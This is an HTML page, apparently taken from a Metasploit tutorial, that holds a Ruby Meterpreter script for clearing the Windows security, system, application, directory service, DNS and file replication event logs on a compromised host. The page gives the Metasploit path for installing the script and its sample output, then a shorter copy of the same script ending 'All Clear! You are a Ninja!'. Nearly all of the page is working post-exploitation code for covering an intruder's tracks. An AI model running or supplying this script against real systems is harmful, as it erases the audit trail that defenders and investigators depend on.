<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Meterpreter</title>
</head><body>log.clear<br/>
def clrevtlgs()<br/>
&#09;evtlogs = [<br/>
&#09;&#09;'security',<br/>
&#09;&#09;'system',<br/>
&#09;&#09;'application',<br/>
&#09;&#09;'directory service',<br/>
&#09;&#09;'dns server',<br/>
&#09;&#09;'file replication service'<br/>
&#09;]<br/>
&#09;print_status("Clearing Event Logs, this will leave and event 517")<br/>
&#09;begin<br/>
&#09;&#09;evtlogs.each do |evl|<br/>
&#09;&#09;&#09;print_status("\tClearing the #{evl} Event Log")<br/>
&#09;&#09;&#09;log = @client.sys.eventlog.open(evl)<br/>
&#09;&#09;&#09;log.clear<br/>
&#09;&#09;&#09;file_local_write(@dest,"Cleared the #{evl} Event Log")<br/>
&#09;&#09;end<br/>
&#09;&#09;print_status("All Event Logs have been cleared")<br/>
&#09;rescue ::Exception =&gt; e<br/>
&#09;&#09;print_status("Error clearing Event Log: #{e.class} #{e}")<br/>
<br/>
&#09;end<br/>
end<br/>
<br/>
After writing our script, we place it in /usr/share/metasploit-framework/scripts/meterpreter/<br/>
run clearlogs<br/>
Clearing Event Logs, this will leave an event 517<br/>
[*] Clearing the security Event Log<br/>
[*] Clearing the system Event Log<br/>
[*] Clearing the application Event Log<br/>
[*] Clearing the directory service Event Log<br/>
[*] Clearing the dns server Event Log<br/>
[*] Clearing the file replication service Event Log<br/>
All Clear! You are a Ninja!<br/>
<br/>
# Clears Windows Event Logs<br/>
evtlogs = [<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'security',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'system',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'application',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'directory service',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'dns server',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'file replication service'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ]<br/>
print_line("Clearing Event Logs, this will leave an event 517")<br/>
evtlogs.each do |evl|<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print_status("Clearing the #{evl} Event Log")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; log = client.sys.eventlog.open(evl)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; log.clear<br/>
end<br/>
print_line("All Clear! You are a Ninja!")</body></html>